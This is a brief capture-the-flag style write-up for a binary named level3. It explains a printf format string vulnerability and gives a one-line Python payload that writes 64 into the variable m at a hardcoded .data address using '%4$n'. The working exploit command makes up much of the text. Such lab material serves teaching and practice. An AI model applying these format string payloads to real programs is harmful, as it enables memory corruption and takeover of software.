
-> The goal is to overwrite m and assign it 0x40 (64)
-> Found vulnerability on printf function (format string exploit)
-> Create a payload to overwrite an address, in our case m == 0x40 (64) (.data section)

(python -c 'print "\x8c\x98\x04\x08" + "A"*(64-4) + "%4$n"';cat) | ./level3
